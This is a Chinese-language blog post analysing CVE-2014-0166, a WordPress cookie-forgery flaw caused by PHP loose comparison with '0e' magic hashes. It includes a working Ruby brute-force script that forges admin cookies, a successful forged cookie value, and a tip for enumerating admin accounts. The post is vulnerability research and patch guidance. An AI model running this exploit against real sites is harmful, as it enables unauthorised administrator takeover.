<h3 id="">前言</h3>

<p>在一陣 OpenSSL Heartbleed 淘金潮中，又有一個技術門檻低、後果嚴重、也同樣需要些運氣的漏洞被揭發－<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166">CVE-2014-0166</a>。CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。 讓我們來分析一下這次的弱點是發生了什麼事吧！</p>
<!-- more -->
<h3 id="_2">解析</h3>

<p>這次出問題的程式碼在<a href="https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650">這邊</a>，關鍵程式碼如下：</p>
<div class='highlight'><pre><code class='php'><span class='nv'>$key</span> <span class='o'>=</span> <span class='nx'>wp_hash</span><span class='p'>(</span><span class='nv'>$username</span> <span class='o'>.</span> <span class='nv'>$pass_frag</span> <span class='o'>.</span> <span class='s1'>&#39;|&#39;</span> <span class='o'>.</span> <span class='nv'>$expiration</span><span class='p'>,</span> <span class='nv'>$scheme</span><span class='p'>);</span>
<span class='nv'>$hash</span> <span class='o'>=</span> <span class='nb'>hash_hmac</span><span class='p'>(</span><span class='s1'>&#39;md5&#39;</span><span class='p'>,</span> <span class='nv'>$username</span> <span class='o'>.</span> <span class='s1'>&#39;|&#39;</span> <span class='o'>.</span> <span class='nv'>$expiration</span><span class='p'>,</span> <span class='nv'>$key</span><span class='p'>);</span>

<span class='k'>if</span> <span class='p'>(</span> <span class='nv'>$hmac</span> <span class='o'>!=</span> <span class='nv'>$hash</span> <span class='p'>)</span> <span class='p'>{</span>
  <span class='sd'>/**</span>
<span class='sd'>   * Fires if a bad authentication cookie hash is encountered.</span>
<span class='sd'>   *</span>
<span class='sd'>   * @since 2.7.0</span>
<span class='sd'>   *</span>
<span class='sd'>   * @param array $cookie_elements An array of data for the authentication cookie.</span>
<span class='sd'>   */</span>
  <span class='nx'>do_action</span><span class='p'>(</span> <span class='s1'>&#39;auth_cookie_bad_hash&#39;</span><span class='p'>,</span> <span class='nv'>$cookie_elements</span> <span class='p'>);</span>
  <span class='k'>return</span> <span class='k'>false</span><span class='p'>;</span>
<span class='p'>}</span>
</code></pre></div>
<p>問題主要發生在比較運算子 != 上面，!= 運算子是 non-strict，會在比較前先做型態轉換，所以下面看似應該是回傳 true 的例子，全部都顯示為 false，細節請參閱<a href="http://www.php.net/manual/en/language.operators.comparison.php">官方手冊</a>。</p>
<div class='highlight'><pre><code class='php'><span class='nb'>var_dump</span><span class='p'>(</span><span class='mi'>0</span> <span class='o'>!=</span> <span class='s2'>&quot;a&quot;</span><span class='p'>);</span> <span class='c1'>// 0 != 0 -&gt; false</span>
<span class='nb'>var_dump</span><span class='p'>(</span><span class='s2'>&quot;1&quot;</span> <span class='o'>!=</span> <span class='s2'>&quot;01&quot;</span><span class='p'>);</span> <span class='c1'>// 1 != 1 -&gt; false</span>
<span class='nb'>var_dump</span><span class='p'>(</span><span class='s2'>&quot;10&quot;</span> <span class='o'>!=</span> <span class='s2'>&quot;1e1&quot;</span><span class='p'>);</span> <span class='c1'>// 10 != 10 -&gt; false</span>
<span class='nb'>var_dump</span><span class='p'>(</span><span class='mi'>100</span> <span class='o'>!=</span> <span class='s2'>&quot;1e2&quot;</span><span class='p'>);</span> <span class='c1'>// 100 != 100 -&gt; false</span>
<span class='nb'>var_dump</span><span class='p'>(</span> <span class='s2'>&quot;0&quot;</span> <span class='o'>!=</span> <span class='s2'>&quot;0e10123456789012345678901234567890&quot;</span> <span class='p'>);</span> <span class='c1'>// 0 != 0 -&gt; false</span>
</code></pre></div>
<p>進入正題，WordPress 認證身分用的 cookie 內容是這樣的：『username|expiration|hmac』。<br /> username 是使用者名稱，<br /> expiration 是有效期限(timestamp)，<br /> hmac 值用來驗證 cookie 是否合法。<br /> 從上面程式碼可以看到，hmac 的算法是經過 username、pass_frag、expiration、key 綜合得出。若有辦法控制 cookie 中的 hmac 使伺服器認為該 cookie 合法，就可以成功偽造成 username。</p>

<p>利用稍早提到的比較運算子問題，若我們讓 cookie 中的 hmac 值為 0，很有可能讓判斷式變成下面這樣：</p>
<div class='highlight'><pre><code class='php'><span class='c1'>//if ( $hmac != $hash ) {</span>
  <span class='k'>if</span> <span class='p'>(</span> <span class='s2'>&quot;0&quot;</span> <span class='o'>!=</span> <span class='s2'>&quot;0e10123456789012345678901234567890&quot;</span> <span class='p'>)</span> <span class='p'>{</span>
    <span class='nx'>do_action</span><span class='p'>(</span> <span class='s1'>&#39;auth_cookie_bad_hash&#39;</span><span class='p'>,</span> <span class='nv'>$cookie_elements</span> <span class='p'>);</span>
    <span class='k'>return</span> <span class='k'>false</span><span class='p'>;</span>
  <span class='p'>}</span>
</code></pre></div>
<p>如此便可以通過驗證，成功偽造合法 cookie。<br /> 而為了讓 $hash == 0，可以不斷改變 cookie 中的 expiration，讓產生的 MD5 值($hash)經過型態轉換後剛好變成 0。<br /> 符合 $hash == 0 的 MD5 $hash 值有 0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX、00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXX….000000000000000000000000000eX、00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)</p>

<p>故出現 $hash == 0 的機率為 Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09</p>

<p>每次偽造的成功機率約為三億分之一，並不會很高，但已經足夠在一個月內拿到最高權限，而且所耗成本並不會很高。</p>

<h3 id="_3">實驗</h3>

<p>為了驗證此方法之可行性，我們架設了 <a href="http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip">WordPress 3.8.1</a> 環境。並且寫程式將登入 cookie 中的 hmac 設為 0，不斷調整 expiration 值測試是否已經登入，程式如下：</p>
<div class='highlight'><pre><code class='ruby'><span class='nb'>require</span> <span class='s1'>&#39;httpclient&#39;</span>

<span class='n'>http</span> <span class='o'>=</span> <span class='no'>HTTPClient</span><span class='o'>.</span><span class='n'>new</span>

<span class='n'>cookie_name</span> <span class='o'>=</span> <span class='s2'>&quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&quot;</span>
<span class='n'>timestamp</span> <span class='o'>=</span> <span class='no'>Time</span><span class='o'>.</span><span class='n'>now</span><span class='o'>.</span><span class='n'>to_i</span>

<span class='p'>(</span><span class='n'>timestamp</span><span class='o'>.</span><span class='n'>.timestamp</span><span class='o'>+</span><span class='mi'>800000000</span><span class='p'>)</span><span class='o'>.</span><span class='n'>each</span> <span class='k'>do</span> <span class='o'>|</span><span class='n'>time</span><span class='o'>|</span>
  <span class='n'>result</span> <span class='o'>=</span> <span class='n'>http</span><span class='o'>.</span><span class='n'>get</span><span class='p'>(</span><span class='s1'>&#39;http://domain.my/WordPress/&#39;</span><span class='p'>,</span> <span class='kp'>nil</span><span class='p'>,</span> <span class='p'>{</span><span class='s2'>&quot;Cookie&quot;</span><span class='o'>=&gt;</span><span class='s2'>&quot;</span><span class='si'>#{</span><span class='n'>cookie_name</span><span class='si'>}</span><span class='s2'>=admin%7C</span><span class='si'>#{</span><span class='n'>time</span><span class='si'>}</span><span class='s2'>%7C0&quot;</span><span class='p'>})</span>
  <span class='k'>if</span> <span class='n'>result</span><span class='o'>.</span><span class='n'>body</span><span class='o'>.</span><span class='n'>include?</span> <span class='s1'>&#39;logout&#39;</span>
    <span class='nb'>puts</span> <span class='s2'>&quot;admin%7C</span><span class='si'>#{</span><span class='n'>time</span><span class='si'>}</span><span class='s2'>%7C0&quot;</span>
    <span class='k'>break</span>
  <span class='k'>end</span>
<span class='k'>end</span>
</code></pre></div>
<blockquote>
<p>註：此程式為 POC，請自行調整為多執行緒版本，不然速度會很慢。</p>
</blockquote>

<p>經過一段長時間的等待，得到的結果如下：</p>

<p><a href="https://lh6.googleusercontent.com/-_iTb2VFAarU/U06kKNXwlzI/AAAAAAAAASo/KKIPDLcRaac/w402-h57-no/iTerm.png"><img src="https://lh6.googleusercontent.com/-_iTb2VFAarU/U06kKNXwlzI/AAAAAAAAASo/KKIPDLcRaac/w402-h57-no/iTerm.png" alt="暴力偽造 cookie，直到成功登入" title="暴力偽造 cookie，直到成功登入" /></a></p>

<p>得知當 cookie 中的 username 為 admin 且 expiration 值為 1421818232 時，伺服器算出來的 hmac 經過型態轉換會變成 0。我們將測試成功的 cookie 值： admin%7C1421818232%7C0 貼到瀏覽器上。成功變成 admin 如下圖，實驗成功！</p>

<p><a href="https://lh3.googleusercontent.com/-Ccf0fswoJX0/U06kL69lmeI/AAAAAAAAASo/Biroo08YcQI/w978-h544-no/Mantra1.png"><img src="https://lh3.googleusercontent.com/-Ccf0fswoJX0/U06kL69lmeI/AAAAAAAAASo/Biroo08YcQI/w978-h544-no/Mantra1.png" alt="利用偽造的 cookie 登入 WordPress" title="利用偽造的 cookie 登入 WordPress" /></a></p>

<blockquote>
<p>註：一般狀況，若不知道 WordPress 最高權限的帳號，可以利用 WordPress 的 feature 在 http://your.WordPress.com/?author=$id ($id: 1,2,3,4…,999,…) 頁面中列舉所有使用者帳號。通常 $id = 1 的 author 都有 WordPress 的管理權限。</p>
</blockquote>

<h3 id="_4">結論</h3>

<p>最近出現了一個高風險通報 CVE-2014-0166，其中提及 WordPress 在舊版驗證 cookie 的部分出現弱點，可以偽造合法 cookie，進而取得 WordPress 管理權限。本文分析了其原理，並且證實之。</p>

<p>對於攻擊者而言，雖然每次偽造 cookie 成功的機率約為三億分之一並不高，但發送三億個 request 後或許能拿到最高權限，已經是值得投資的級數。</p>

<p>對於 WordPress 管理者而言，建議立即更新至 3.8.2 以後版本，以免受到此風險攻擊。</p>

<p>從此事件也提醒了 PHP 開發者，在撰寫重要的驗證行為，要特別注意 PHP 比較運算子的特性，請使用 === (不等於請用 !==)來保證等式左右型態與值為一樣，避免因為轉型造成的資安風險。</p>